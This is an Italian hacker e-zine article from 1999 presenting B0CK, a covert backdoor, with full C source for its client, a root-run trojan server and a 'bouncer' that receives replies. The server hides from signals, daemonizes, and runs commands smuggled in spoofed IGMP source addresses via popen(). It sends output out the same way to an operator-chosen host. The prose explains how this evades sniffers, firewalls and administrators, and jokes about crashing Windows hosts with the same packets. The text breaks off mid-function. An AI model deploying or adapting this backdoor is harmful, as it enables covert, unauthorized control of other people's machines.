@@ -1,0 +1,1007 @@
+==============================================================================
+------------[ BFi numero 7, anno 2 - 25/12/1999 - file 12 di 22 ]-------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ B0CK - vecna@ircnet <vecna@mail.com>
+
+
+Premessa: l'idea cruciale per lo sviluppo di questa backdoor mi e' venuta
+mentre portavo a casa un etto di prosciutto crudo.
+
+[1] * I N T R O D U Z I O N E
+
+Di shell remote se ne sono gia' viste due: la prima, scritta da route, e'
+apparsa su Phrack e la seconda, 007Shell di FuSyS, e' stata pubblicata su BFi4
+con realtiva libreria che consentisse l'icmp tunnelling mettendo i dati
+occultati nel field icmp_data .
+
+Il fine principale di queste backdoor e' mandare dati ad un server remoto
+senza l'utilizzo di connessioni stabili e senza che un normale sniffer possa
+individuare i dati incapsulati in questi campi, dove normalmente non stanno
+dei dati.
+
+Per quanto belli e utili, questi codici hanno due pecche che, se eliminate,
+migliorerebbero notevolmente le loro funzionalita'. I problemi che ho
+individuato sono:
+
+1 - l'ICMP e' oramai filtrato ovunque e quel poco che non viene filtrato
+    e' comunque loggato;
+2 - per aumentare l'intracciabilita' e far diminuire i sospetti che si
+    avrebbero vedendo che il solito ip continua a mandare ECHO_REPLY non
+    richiesti, i pacchetti vengono mandati (e mi sembra il minimo :)
+    spoofati. E cosi'... anche se il nostro troiano-server fosse stato
+    previsto per leggere le risposte, non le avrebbe mandate indietro (o
+    almeno non a noi).
+
+B0CK risolve entrambi questi problemi :)
+
+[2] * S T R U T T U R A   E   F U N Z I O N A M E N T O
+
+Uno dei protocolli piu' supportati, ma meno cagati in assoluto (se ne sente
+parlare solo dopo l'uscita del DoS "kiss of death" di klepto) e' l'IGMP
+(Internet Group Management Protocol).
+Visto il terreno fertile che presenta questo protocollo, mi sono lanciato
+(in mancanza di dati interessanti sulle RFC) su /usr/include/netinet/igmp.h .
+La struttura di questo protocollo e':
+
+struct igmp
+{
+        __u8 igmp_type;
+        __u8 igmp_code;
+        __u16 igmp_cksum;
+        struct in_addr igmp_group;
+};
+
+Mmhhh... 8 bit per il type, 8 bit per il code e 16 per il checksum...
+Partendo dal presupposto che il checksum non si tocca e che type+code sono
+troppo piccoli (16 bit...) mi sembra proprio impossibile occultare dei dati
+li' dentro... se non fosse perche' c'e' un altro header nel pacchetto che
+mandiamo... li', sopra l'header igmp, c'e' l'header IP.
+
+E allora perche' non possiamo mettere i dati NELL'IP, nell'ip da noi spoofato?
+(no, no! fermi! non sono pazzo :)
+Il field ip.saddr e' di 32 bit e contiene l'ip sorgente del pacchetto...
+Se noi dobbiamo spoofarci, che cazzo ce ne frega dell'ip che mettiamo dentro?
+(si', e' possibile che un firewall consenta l'arrivo di pacchetti solo da un
+certo ip... ma c'e' una soluzione anche per questo :) cosi' l'ip che noi
+mandiamo conterra' il dato da noi inviato.
+Del resto se ogni carattere ha un equivalente ASCII da 8 bit ed il pacchetto
+ha un ip con un indirizzo mittente diviso in 4 campi da 8 bit, va' a finire
+che con un pacchetto ogni 4 byte, riuscitamo a inviare tutti i nostri dati
+(e non abbiate paura del flood... in tutto sono 24 byte a pacchetto).
+
+Quindi se noi mandiamo al server remoto il comando "ls -la", con un
+igmplogger leggeremo in ricezione:
+
+Sep 23 14:18:27 TruZz0 -algad-: from 108.115.32.45 IGMP type 0 code 0
+Sep 23 14:18:27 TruZz0 -algad-: from 108.97.0.0 IGMP type 0 code 0
+[ 14:18:27... porka troia mi sono perso i simspon >:\\ ]
+
+Con:
+
+     108.115.32.45 108.97.0.0
+     l   s  " " -  l  a  <0 = invio>
+
+Questa e' la struttura generale della trasmissione, ma il problema delle
+risposte c'e' ancora... Se io non mando i pacchetti con il mio ip come
+faccio a leggere le mie risposte? Semplicemente con un comando particolare,
+interno alla backdoor che non verra' eseguito sul server, e che serve ad
+indicare a che ip bisogna mandare le risposte :) .
+E' possibile gia' con un #define compilare il programma con l'ip a cui deve
+mandare le risposte di default. Nel caso volessimo lavorare con un altro
+ip o mandare le risposte altrove, si utilizzera' il comando
+
+SETREP=ip_a_cui_mandare_le_risposte
+
+Ma attenzione, sia "SETREP=" che "BOUNCE=" (comando analogo che spieghero'
+in seguito) vogliono l'ip numerico, non il nome del nostro host o dynamic
+host. Solo quei 4 numerini con 3 puntini in mezzo :)
+
+[3] * P O S S I B I L I   M I G L I O R I E
+
+E' possibile che si voglia aumentare l'efficenza della trasmissione, ad
+esempio utilizzando altri campi dell'IP (questo in fin dei conti e' IP
+tunnelling con utilizzo dell'IGMP come protocollo di trasporto) o comprimendo
+i dati prima di inviarli. Se poi ci troviamo un firewall che consenta
+l'accesso di OGNI pacchetto purche' abbia un detrminato ip (cosa remota,
+ma possibile: normalmente queste restrizioni sono applicate solo alle
+connessioni TCP) allora sara' necessario spoofare quell'ip e utilizzare un
+altro campo per la trasmissione.
+
+Se diamo un'occhiata al datagramma IP e alla sua struttura (RFC 791 e
+/usr/include/netinet/ip.h) potremo scovare altri campi atti a contenere dati.
+
+< non riporto il datagramma perche' e' gia' spiegato da altre parti :) >
+
+struct ip {
+        __u8    ip_v:4,
+                ip_hl:4;
+        __u8    ip_tos;
+        __u16   ip_len;
+        __u16   ip_id;
+        __u16   ip_off;
+        __u8    ip_ttl;
+        __u8    ip_p;
+        __u16   ip_sum;
+        struct  in_addr ip_src,ip_dst;
+};
+
+Quanti! :D Allora:
+
+ip_v,ip_h : Lasciamoli stare... 8 bit e' poco x rischiare che un router ci
+            seghi i pacchetti non riconoscendo la versione dell'ip e una
+            ihl (internet header lenght, di default 5) diversa dal solito.
+
+ip_len e ip_sum : Se mettiamo dei valori arbitrari viene segato al volo :)
+
+ip_ttl e ip_p : TTL e tipo di protocollo, inutilizzabili perche' utili
+		cosi'.
+
+ip_id e ip_off : 16 bit ognuno... mmhh... :) questi campi servono per
+                 riassemblare in modo ordinato i pacchetti che contengono
+                 il dato... e perche' non usarli? Avete paura che i
+                 pacchetti arrivino in ordine sparso? C'e' il rischio...
+                 vi posso assicurare che ho fatto test, senza mai avere
+                 packet lost o dati disordinati, lavorando in remoto sul
+                 pc di un amico (e non del mio stesso ISP :) senza aver 
+                 mai cagato questi due campi.
+
+Ok, nel caso il saddr non sia utilizzabile ci sono anche i campi sostitutivi
+(nessuno vieta di usare anche questo per migliorare la trasmissione, in modo
+da avere 8 byte a pacchetto e dimezzare il numero di pacchetti).
+
+[4] *  C O D I C I  &  C O M M E N T I
+ 
+B0CKc.c
+---------- snip ----------
+/* * Vecna - Agosto/Settembre 1999 - B0CK - versione unica * * * * * * * *
+
+                                 +[1]+
+# L'unico scopo x cui l'autore ha codato questo programma e' DIVERTIRSI
+# e fare ESPERIENZA. Fatelo anche voi. Si sconsiglia l'utilizzo di B0CK
+# per fini illeciti, ma questo codice e' free come le vostre scelte...
+# (ma lasciate pulita la vostra fedina penale :)
+# Commenti, consigli, idee ed implementazioni... -> vecna@mail.com 
+
+                                 +[2]+
+    Tnx To:
+    NaiL^d0d  -+-+-+-+-+-+-> seeeeeeeeeempre utile :)
+    FuSyS     -+-+-+-+-+-+-> per i lavori svolti
+    Crush^KiC -+-+-+-+-+-+-> fiken! :D 
+    L0rD`n0p1 -+-+-+-+-+-+-> per le notti a casa tua :)
+
+* * * Vecna - Agosto/Settembre 1999 - B0CK  * * * * * * * * * * * * * * */
+
+#define SIZEREPBUFF 12000           /* grandezza massima per le risposte */
+#define LOCAL                       /* local usage mode on :)   */
+                                    
+#include <stdio.h>
+#include <stdlib.h>
+#include <netdb.h>
+#include <strings.h>
+#include <sys/socket.h>
+#include <sys/utsname.h>
+#include <netinet/in.h>
+
+#include <netinet/ip.h>
+#include <netinet/igmp.h>
+
+/* nel caso dovreste avere dei problemi nella compilazione, a causa di
+incompatibilita' tra librerie, provate a sostituite netinet/ip.h e
+netinet/igmp.h con linux/ip.h e linux/igmp.h ... sul mio picci' c'e'
+troppo casino tra le librerie per mettere dei define decenti :) */
+
+void end(int);
+void data2ip(unsigned int dest_addr);
+void wait_igmp(void);
+char ch[80];
+int luce=1;
+
+unsigned int host2ip(char *hostname)
+  {
+  static struct in_addr i;
+  struct hostent *h;
+  if(i.s_addr =(inet_addr(hostname))== -1) 
+    {
+    h = (gethostbyname(hostname));
+    if(!h) end(3);
+    bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
+    }
+  return i.s_addr;
+  }
+
+unsigned short in_cksum(unsigned short *buh, int len) {
+  long sum = 0;
+  unsigned short oddbyte;
+  unsigned short answer;
+
+        while(len > 1) {
+                sum += *buh++;
+                len -= 2;
+        }
+
+        if(len == 1) {
+          oddbyte = 0;
+          *((unsigned char *)&oddbyte) = *(unsigned char *)buh;
+          sum += oddbyte;
+        }
+
+        sum = (sum >> 16) + (sum & 0xFFFF);
+        sum += (sum >> 16);
+        answer = ~sum;
+        return answer;
+}
+/* routine per dns e checksum, gia' viste N volte con N->infinito :) */
+
+void main(int argc, char **argv) { 
+  unsigned int victim_addr;
+  int ls; 
+  if((getuid()!=0)&&(geteuid()!=0)) end(5);
+  if(argc!=2) end(4);
+  if(!strcmp(argv[1],"-h")) end(6);
+  victim_addr=host2ip(argv[1]);
+  while(1) {
+    memset(ch,0,80);             
+    printf("\n[-B0CK-@%s]# ",argv[1]);
+    gets(ch);
+    if(!strlen(ch)) continue;
+    data2ip(victim_addr);
+  }
+}
+/* si inizia! come primo argv si passa l'indirizzo della vittima, dove
+verranno recapitati i pacchetti IGMP, se si una -h si ha un veloce help
+sulle funzioni. Da notare che dovete eseguirlo (ma dai :) da root */
+
+void data2ip(unsigned int dest_addr) {
+  int i,ls=0;
+  unsigned int data_addr;
+  char *iptmp=malloc(1024);
+  ls = strlen(ch);
+  for(i=0;i<=ls;i+=4) {
+    if(ch[i]==0) ch[i]=32;
+    sprintf(iptmp,"%d.%d.%d.%d",ch[i],ch[i+1],ch[i+2],ch[i+3]);
+    data_addr=inet_addr(iptmp);
+    send_igmp(dest_addr,data_addr);
+    }
+  if(!strcmp(ch,"BYE")) end(0);
+  if(!strncmp(ch,"BOUNCE=",7)) luce=0;
+  if(!strncmp(ch,"LUCE",4)) luce=1;
+  if(luce) wait_igmp();
+}
+/* data2ip e' la funzione che converte i dati da spedire in campi dell'ip,
+e' possibile utilzzare un modo meno grezzo di sprintf, ma e' sicuramente piu'
+leggibile. da notare una cosa:
+se mando un comando da 3 byte, verrano messi i 3 campi e poi uno zero
+a indicare la fine della trasmissione. se mando un comando da 4 byte (o
+un numero multiplo di 4), verranno inviati 2 pacchetti, uno con il
+comando, l'altro sara' 32.0.0.0 (32 e' il simbolo ascii dello spazio) x
+ovvie ragioni non mando pacchetti con ip 0.0.0.0 :) 
+da notare che quando si fa' uso del bouncer (comando BOUNCE=xx.xx.xx.xx)
+la shell diventa cieca (le risposte arrivano al bouncer), ma si po' usare
+questa opzione anche nel caso non si voglia visualizzare l'output di
+nostri comandi, e mandare i pacchetti altrove. */
+
+void send_igmp(unsigned int dest_addr,unsigned int src_addr) {
+  struct iphdr {
+    unsigned char ihl:4, version:4, tos;
+    unsigned short tot_len, id, frag_off;
+    unsigned char ttl, protocol;
+    unsigned short check;
+    unsigned int saddr, daddr;
+  };
+  struct iphdr *ip;
+
+  struct igmphdr {
+    unsigned char type, code;
+    unsigned short cksum;
+    struct in_addr group;
+  };
+  struct igmphdr *igmp;
+
+  struct sockaddr_in dst;
+  long daddr, saddr;
+  int s, i=0, c,len;
+  char buf[150];
+
+  memset(buf, 0, 150);
+  ip = (struct iphdr *)&buf;
+  igmp = (struct igmphdr *)&buf[sizeof(struct iphdr)];
+
+  dst.sin_addr.s_addr = dest_addr;
+  dst.sin_family = AF_INET;
+
+  igmp->type = 0;
+  igmp->code = 0; 
+
+  ip->ihl = 5;
+  ip->version = 4;
+  ip->tos = 0;
+  ip->tot_len = htons(10933);
+  ip->id = htons(48648);
+  ip->ttl = 64;
+  ip->protocol = IPPROTO_IGMP;
+  ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
+  ip->saddr = src_addr;
+  ip->daddr = dest_addr;
+
+  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (s == -1) end(1);
+
+  len = 220;
+  ip->frag_off = 0;
+  if (sendto(s,&buf,len,0,(struct sockaddr *)&dst,sizeof (struct sockaddr_in)) == -1) end(2);
+  close(s);
+}
+/* questa e' piu' o meno la funzione del KoD tratta dal dos omonimo: il
+pacchetto IGMP viene forgiato con type e code = 0. (che poi sono gli
+stessi parametri delle nuke) sarebbe stato vantaggioso per la backdoor
+utilizzare una varieta' maggiore di type e code, in modo da trasmettere
+anche in quei campi delle informazioni, ma ho notato che gli unici
+pacchetti che arrivano sempre a destinazione sono quelli con type e code =
+0. nel caso vogliate nukkare qualcuno, basta ridirigergli l'output
+contro :) (windoze down NOW!)
+eh gia'...
+ma... cosa succede se l'host troianizzato sia in una lan interna, che come
+gw o firewall abbia una macchina NT? la macchina NT dovrebbe supportare
+il protocollo e non subire gli effetti (quindi far funzionare la nostra
+bd, sono i SO Win9x vulnerabili al KoD). Nel caso non supporti il
+protocollo, o siate davanti a uno dei pochi firewall che filtra gli igmp,
+l'unico consiglio e' quello di cambiare protocollo (a vostra scelta)
+rimanendo cmq l'ip tunnelling l'idea principale sul quale si basa la
+backdoor.
+
+In ogni caso, se voi stessi volete evitare grane dovute a DoS o altro che
+sfruttano questo protocollo, tra le Rules di ipchains (speranzoso che
+tutti voi carichiate l'amato fw :) mettete:
+
+#----------------------------------------------------------------- IGMP
+echo -n "IGMP Rules.."
+        $IPCHAINS -A input -p igmp -s $REMOTENET -d $LOCALNET -l -j DENY
+#------------------------------------------------------------- E0F IGMP
+
+(quindi un po' di flessibilita' nel protocollo e' dovuta :) ho scelto
+l'igmp, in quanto e' il meno cagato). 
+*/
+
+void wait_igmp(void) {
+  int sock_waiting,i,c,fatto;
+  char rep[SIZEREPBUFF];
+
+  struct ippkt {
+    struct iphdr ip;
+    struct igmphdr igmp;
+    char buffer[500];
+  } pkt;
+
+  sock_waiting=socket(AF_INET, SOCK_RAW, 2);
+  memset(rep,0,SIZEREPBUFF);
+  i=0;
+  while(1) {
+    read(sock_waiting, (struct ippkt *)&pkt, 499);
+#ifdef LOCAL
+  if((pkt.igmp.type==1)||(pkt.igmp.code==1)) {
+#endif
+    if((c=((pkt.ip.saddr)<<24)>>24)==0) {
+      printf("%s",rep);
+      memset(rep,0,SIZEREPBUFF);
+      break;
+    }
+    else rep[i]=c;
+    if((c=((pkt.ip.saddr)<<16)>>24)==0) {
+      printf("%s",rep);
+      memset(rep,0,SIZEREPBUFF);
+      break;
+    }
+    else rep[i+1]=c;
+    if((c=((pkt.ip.saddr)<<8)>>24)==0) {
+      printf("%s",rep);
+      memset(rep,0,SIZEREPBUFF);
+      break;
+    }
+    else rep[i+2]=c;
+    if((c=(pkt.ip.saddr)>>24)==0) {
+      printf("%s",rep);
+      memset(rep,0,SIZEREPBUFF);
+      break;
+    }
+    else rep[i+3]=c;
+    i+=4;
+#ifdef LOCAL
+  } 
+  else continue;
+#endif  
+  }
+}
+/* 4 cose su questa funzione, la PRIMA e' che potrebbe essere ottimizzata
+:), ma non ci sono riuscito :\ la SECONDA e' che e' qui che si decide il
+tipo di pacchetti da aspettare... il tipo di protocollo viene settato nella
+funzione 
+
+   sock_waiting=socket(AF_INET, SOCK_RAW, 2);
+
+secondo i parametri definiti in /etc/protocols (2 IGMP, 6 TCP, 1 ICMP
+ecc...) e' possibile implementare la backdoor sfruttando TCP, UDP o ICMP.
+(solo che sono piu' soggetti a logging e filtraggi). inoltre, la funzione
+read() causa la magica apparizione di :
+
+raw        0      0 *:2                     *:*
+
+dopo "netstat -a". e' difficile accorgersene (e' + difficile che
+accorgersi del processo in bg "./B0CKs" :) ma e' chiaro che qualcosa sta'
+aspettando dei pacchetti di tipo 2 e non e' una cosa frequente. 
+la TERZA riguarda il #define LOCAL all'inizio del codice. per poter testare
+questo programma in locale, ho dovuto diversificare i pacchetti spediti
+da quelli in ricezione, siccome non avevo restrizioni dovute alla rete,
+ho impostato i pacchetti in uscita con type e code = 0 e quelli in
+ricezione = 1. questo e' stato necessario, altrimenti il mio dato inviato
+sarebbe stato letto sia dalla read() del server che l'avrebbe eseguito
+come comando, sia dalla read() del client che aspetta le risposte.
+e' necessario commentare #define LOCAL se lo si vuole usare in rete.
+la QUARTA riguarda il modo in cui leggo i dati dal pacchetto :
+   
+             if((c=((pkt.ip.saddr)<<8)>>24)==0) {
+
+dipende esclusivamente dal Byte Order, dall'ip umano "127.0.0.1" con la
+funzione inet_addr("127.0.0.1") convertiamo l'ip in un numero a 32 bit.
+seguendo quegli shifting riusciamo a riottenere i dati. (rfc791) 
+*/
+
+void end(int err_num)
+ {
+  switch (err_num)
+   {
+    case 0: fprintf(stdout,"\nBye Fradel!\n"); break;
+    case 1: perror("socket()"); break;
+    case 2: perror("sendto()"); break;
+    case 3: fprintf(stderr,"unresolve hostname destination !\n"); break;
+    case 4: fprintf(stderr,"option: program victim \n"); break;
+    case 5: fprintf(stderr,"B0CK client required r00t rulez permission\n"); break;
+    case 6: fprintf(stderr,"\n#LUCE = setta visione mode of \n#BOUNCE=xxx.xx.xx.xxx visione off e ip di rep xxx.xx.xx.xxx \n#SETREP=yy.yy.yy.yy risposta ma con visione dipendente da LUCE \n#BYE chiudi tutto.\n"); break;
+  }
+  exit(0);
+ }
+/* messaggi di errore, help, uscita */
+---------- snip ----------
+
+B0CKs.c
+---------- snip ----------
+#define SIZEBUFF 12000             /* max size risposta inviata */
+#define LOCAL
+#define DEFAULT_IP_REPLY "127.0.0.1"
+#define MOTHER_DIR   "/tmp"
+#define ERROR_FILENAME "filerr"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#include <netinet/ip.h>
+#include <netinet/igmp.h>
+
+void new_bg(void);
+void exe(void);
+void data2ip(unsigned int);
+void end(int err_num);
+void wait_igmp(void);
+char dc(char);
+unsigned short in_cksum(unsigned short *, int);
+char cmd[50],ch[SIZEBUFF];
+
+int main(void) {
+  if(geteuid()!=0) end(3);
+  new_bg();     
+  freopen(ERROR_FILENAME,"w",stderr); 
+  memset(ch,0,SIZEBUFF);
+  wait_igmp();
+  exit(0);
+}
+/* Per ora vi dico che freopen("filerr","w",stderr) serve per redirigere 
+il flusso stderr nel file /tmp/filerr. era meglio unificare stdout 
+e stderr in stdout... ma ne' con dup(), ne' con dup2() ne' con freopen ci sono
+riuscito :\\ e che vi devo dire... programmo solo da 5 mesi :\ (vale a
+dire flame/spam -> /dev/null :) */
+
+void wait_igmp(void) {
+  int i=0,s,fatto;
+  unsigned int c=0;
+ 
+  struct ippkt {
+    struct iphdr ip;
+    struct igmphdr igmp;
+    char buffer[500];
+  } pkt;
+
+    s=socket(AF_INET, SOCK_RAW, 2);
+    while(1) {
+      fatto=0; 
+      i=0;
+      while(1) {
+        read(s, (struct ippkt *)&pkt, 499);   
+#ifdef LOCAL
+        if((pkt.igmp.type==0)||(pkt.igmp.code==0)) {
+#endif
+        if((c=((pkt.ip.saddr)<<24)>>24)==0) {
+          fatto++;
+          exe();
+        }  
+        else cmd[i]=c;
+        if(fatto) break;
+        if((c=((pkt.ip.saddr)<<16)>>24)==0) {
+          fatto++;
+          exe();
+        }
+        else cmd[i+1]=c;
+        if(fatto) break;
+        if((c=((pkt.ip.saddr)<<8)>>24)==0) {
+          fatto++;
+          exe();
+        }
+        else cmd[i+2]=c;
+        if(fatto) break;
+        if((c=(pkt.ip.saddr)>>24)==0) {
+          fatto++;
+          exe();
+        }
+        else cmd[i+3]=c;
+        if(fatto) break;
+        i+=4;
+#ifdef LOCAL
+      }  
+      else continue;
+#endif 
+      } 
+    }
+  }
+/* anche qui stesso accorgimento su #define LOCAL. se vi chiedete il
+perche' dell'utilizzo di 2 cicli while(1) e' perche' dopo aver eseguito un
+comando devo anche tornare all'inizio del ciclo dopo averlo interrotto con
+break, solo che se sono in un ciclo solo esco dal programma :) */
+
+void exe(void) {
+  char c,ip[15];
+  unsigned int flood_addr=inet_addr(DEFAULT_IP_REPLY);
+  int i=0;
+  FILE *exek;
+
+  if(!strncmp(cmd,"BYE",3)) exit(0);
+  if((!strncmp(cmd,"SETREP=",7))||(!strncmp(cmd,"BOUNCE=",7))) {
+    for(i=0;(i!=(strlen(cmd)-7));i++) ip[i]=cmd[7+i];
+    if((flood_addr=inet_addr(ip))==-1) flood_addr=inet_addr(DEFAULT_IP_REPLY);
+    memset(ip,0,15);
+  } else {
+    if(!(exek=popen(cmd,"r"))) end(5);
+    while((ch[i]=fgetc(exek))!=EOF) i++;
+    pclose(exek);
+  }
+  if(!i) {
+    strcpy(ch,"- comando eseguito - nessun output ricevuto -\n ");
+    i=strlen(ch);
+  }
+  if (i!=((i/4)*4)) ch[i-1]=32;
+  else ch[i-1]=0;
+  ch[i]=0;
+  data2ip(flood_addr);
+  memset(cmd,0,50);
+} 
+/* ecco la funzione che mi ha fatto perdere almeno una settimana :) bhe,
+arriva il comando, immediatamente viene confrontato con le stringhe di
+controllo (BOUNCE, SETREP o BYE), per evitare di eseguire comandi diretti
+al programma. se il comando eseguito con popen() non genera output (o si
+tratta di un comando che non ha previsto output, o e' messaggio di errore)
+manda a flood_addr (l'indirizzo a cui vengono inviate le risposte) una  
+stringa arbitraria. poi, sta all'utente cattarsi filerr o continuare a  
+lavorare.
+
+  if (i!=((i/4)*4)) ch[i-1]=32;
+
+i!=i/4*4 -> i!=i ? NO! questa operazione serve per capire se i e'
+divisibile per 4. in questo caso alla risposta gli attacco 32 per non
+generare in risposta pacchetti con quattro zeri che non arriverebbero,
+lasciando il mio client ad aspettare il segnale di fine tramissione che e'
+gia' stato inviato (un timeout mi sembra superfluo). */
+
+void send_igmp(unsigned int flood_addr,char *iptmp) {
+  struct iphdr {
+    unsigned char ihl:4, version:4, tos;
+    unsigned short tot_len, id, frag_off;
+    unsigned char ttl, protocol;
+    unsigned short check;
+    unsigned int saddr, daddr;
+  };
+  struct iphdr *ip;
+
+  struct igmphdr {
+    unsigned char type, code;
+    unsigned short cksum;
+    struct in_addr group;
+  };
+  struct igmphdr *igmp;
+
+  struct sockaddr_in dst;
+  long daddr, saddr;
+  int s, i=0, c,len;
+  char buf[150];
+
+  memset(buf, 0, sizeof(buf)); 
+  ip = (struct iphdr *)&buf;
+  igmp = (struct igmphdr *)&buf[sizeof(struct iphdr)];
+
+  dst.sin_addr.s_addr = flood_addr; 
+  dst.sin_family = AF_INET;
+
+#ifdef LOCAL
+  igmp->type = 1;
+  igmp->code = 1; 
+#else
+  igmp->type = 0;
+  igmp->code = 0; 
+#endif
+
+  ip->ihl = 5;
+  ip->version = 4;
+  ip->tos = 0;
+  ip->tot_len = htons(10933);
+  ip->id = htons(48648);
+  ip->ttl = 64;
+  ip->protocol = IPPROTO_IGMP;
+  ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));
+  ip->saddr = inet_addr(iptmp);
+  ip->daddr = flood_addr;
+
+  if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))==-1) end(1);
+
+  len = 220;
+  ip->frag_off = 0;
+  if (sendto(s,&buf,len,0,(struct sockaddr *)&dst,sizeof (struct sockaddr_in)) == -1)  end(2);
+  close(s);
+ }
+/* solita routine per mandare i pacchetti... con la differenza che se viene
+usato in locale vengono inviati pacchetti con type e code = 1 che NON
+VANNO IN RETE */
+
+void data2ip(unsigned int flood_addr) {
+  int i,ls;
+  char *iptmp=malloc(1024);
+  ls=strlen(ch);
+  while(ls!=((ls/4)*4)) ls++;
+  for(i=0;i!=ls;i+=4) {
+    sprintf(iptmp,"%d.%d.%d.%d",ch[i],ch[i+1],ch[i+2],ch[i+3]);
+    send_igmp(flood_addr,iptmp);
+  } 
+  memset(ch,0,SIZEBUFF);
+}
+/* gia' vista */
+
+void new_bg(void) {
+  int piddo;
+
+  signal(SIGHUP, SIG_IGN);
+  signal(SIGINT, SIG_IGN);
+  signal(SIGTERM, SIG_IGN);
+  signal(SIGQUIT, SIG_IGN);
+  signal(SIGALRM, SIG_IGN);
+
+  piddo=fork();   
+  if(piddo < 0) end(4);
+  if(piddo > 0) exit(0);
+  chdir(MOTHER_DIR);
+} 
+/* i segnali di term e close vengono ignorati :)
+per mandare in BG gli faccio fare un figlio e gli uccido il padre. 
+Ma poi il figlio va in un orfanotrofio? :D */
+
+unsigned short in_cksum(unsigned short *buh, int len) {
+  long sum = 0;
+  unsigned short oddbyte;
+  unsigned short answer;
+
+  while(len > 1) {
+    sum += *buh++;
+    len -= 2;
+  }
+  if(len == 1) {
+    oddbyte = 0;
+    *((unsigned char *)&oddbyte) = *(unsigned char *)buh;
+    sum += oddbyte;
+  }
+  sum = (sum >> 16) + (sum & 0xFFFF);
+  sum += (sum >> 16);
+  answer = ~sum;
+  return answer;
+}
+/* scommetto che l'avete gia' vista :) */
+
+void end(int err_num) {
+  switch (err_num) {
+    case 0: fprintf(stdout,"\nBye Fradel!\n"); break;
+    case 1: perror("socket()"); break;
+    case 2: perror("sendto()"); break;
+    case 3: fprintf(stderr,"B0CK server required r00t rulez permission\n"); break;
+    case 4: perror("fork()"); break;
+    case 5: perror("popen()"); break;
+  }
+  exit(0);
+}
+/* non sono troppo convinto dell'utilita' di questi messaggi di errore...
+non e' bello che l'admin sappia che popen() o sendto() in un troiano non
+vada :) a vostra discrezione la sua liberta' di informazione! */
+---------- snip ----------
+
+B0CKb.c
+---------- snip ----------
+#define SIZEREPBUFF 12000
+#define LOCAL
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <netdb.h>
+#include <strings.h>
+#include <sys/socket.h>
+#include <sys/utsname.h>
+#include <signal.h>
+#include <netinet/in.h>
+
+#include <netinet/ip.h>
+#include <netinet/igmp.h>
+
+void end(int);
+void wait_igmp(int);
+void chk_signals(void);
+void chiusura(int);
+int log;
+
+void main(int argc, char **argv) { 
+int oz,o=0;
+  chk_signals();
+  if(geteuid()!=0) end(3);
+  if(argc<2) end(0);
+  while ((oz = getopt(argc, argv, "o:f:a")) != -1) switch (oz) {
+    case 'a': if ((log = open(optarg, O_WRONLY|O_CREAT)) == -1) end(4);
+    case 'o': o=1; 
+              break;
+    case 'f': if ((log = open(optarg, O_WRONLY|O_CREAT)) == -1) end(4);
+              break;
+    default : end(0);
+  }
+  while(1) {
+    if(o) printf("\n[-B0CK-Bouncer]");
+    if(log) write(log,"[-B0CK-Bouncer]",15);
+    wait_igmp(o);
+  }
+}
+/* e che cazzo e' il B0CK Bouncer? per tutti i paranoici, che temono che
+sul piu' bello un root avvii tcpdump e legga:
+
+15:36:16.838632 46.47.99.108 > 151.66.254.155: igmp-0 [v0][|igmp]
+15:36:16.840379 32.108.111.99 > 151.66.254.155: igmp-0 [v0][|igmp]
+
+notando che questo 151.66.254.155 (io o l'usufruitore di turno) continua a
+ricevere tanti pacchettini IGMP con un ip diverso che partono dalla sua
+macchina :) il bouncer serve per ascoltare e eventualmente loggare tutte
+le risposte che gli mandate. settate dal client il suo funzionamento con
+BOUNCE=yy.yy.yyy.yy, da quel momento la vostra shell diventera' cieca, ma
+le risposte arriveranno sul bouncer.
+
+      +-+-+-+-+    +-+-+-+-+    +-+-+-+-+    wow, e adesso chi ci becca +
+      |  IO   |--->|Server |--->|Bouncer|     [  anche sul bouncer  ]
+      +-+-+-+-+ ^  +-+-+-+-+ ^  +-+-+-+-+     [  dovete essere root ]
+                |            | 
+              spoof        spoof
+             comandi      risposte
+*/
+
+void wait_igmp(int o) {
+  int sock_waiting,c;
+  int i=0;
+  char rep[SIZEREPBUFF];
+
+  struct ippkt {
+    struct iphdr ip;
+    struct igmphdr igmp;
+    char buffer[500];
+  } pkt;
+
+  sock_waiting=socket(AF_INET, SOCK_RAW, 2);
+  memset(rep,0,SIZEREPBUFF);
+  while(1) {
+    read(sock_waiting, (struct ippkt *)&pkt, 499);
+#ifdef LOCAL
+  if((pkt.igmp.type==1)||(pkt.igmp.code==1)) {
+#endif
+    if((c=(pkt.ip.saddr<<24)>>24)==0) {
+      if(o) printf("\n%s",rep); 
+      if(log) write(log,rep,sizeof(rep));
+      break;
+    }
+    else rep[i]=c;
+    if((c=(pkt.ip.saddr<<16)>>24)==0) {
+      if(o) printf("\n%s",rep); 
+      if(log) write(log,rep,sizeof(rep));
+      break;
+    }
+    else rep[i+1]=c;
+    if((c=(pkt.ip.saddr<<8)>>24)==0) {
+      if(o) printf("\n%s",rep); 
+      if(log) write(log,rep,sizeof(rep));
+      break;
+    }
+    else rep[i+2]=c;
+    if((c=pkt.ip.saddr>>24)==0) {
+      if(o) printf("\n%s",rep); 
+      if(log) write(log,rep,sizeof(rep));
+      break;
+    }
+    else rep[i+3]=c;
+    i+=4;
+#ifdef LOCAL
+  }
+  else continue;
+#endif
+  }
+}
+/* analogamente alla routine del server, solo che qui, quando ha letto
+tutto, o lo printa su un file, o su stdout, o entrambe. */
+
+void chk_signals(void) {
+  signal(SIGTERM,chiusura);
+  signal(SIGALRM,chiusura);
+  signal(SIGKILL,chiusura);
+  signal(SIGSTOP,chiusura);
+}
+
+void chiusura(int s) {
+  char exit_string[23];
+  fprintf(stderr,"close at signal %d",s);
+  if(log) {
+    sprintf(exit_string,"close at signal %d",s); 
+    write(log,exit_string,sizeof(exit_string));
+  }
+  close(log);
+  exit(0);
+}
+/* siccome potete interrompere con ^C il programma, (o con kill o in
+altri modi) in questo modo si fa' in tempo a fare l'fclose e a lasciare il
+contenuto nel file (file per altro con permessi 000 :)
+
+void end(int err_num)
+ {
+  switch (err_num)
+   {
+    case 0: fprintf(stderr," options:\n -o [stdout output]\n -f <file> [log reply in file]\n -a file [stdout & file log]\n"); break;
